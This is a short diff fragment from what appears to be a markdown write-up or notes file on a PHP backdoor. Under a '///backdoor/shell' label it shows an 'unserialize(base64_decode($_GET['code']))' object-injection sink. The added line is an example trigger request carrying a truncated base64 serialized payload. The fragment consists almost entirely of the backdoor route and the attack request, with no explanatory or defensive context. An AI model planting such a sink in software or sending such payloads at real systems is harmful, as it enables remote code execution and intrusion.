@@ -3,6 +3,8 @@
 ```
 ///backdoor/shell
 unserialize(base64_decode($_GET['code']))
+
+?r=backdoor/shell&code=TzoyMzoieW...
 ```
 ```
 <?php
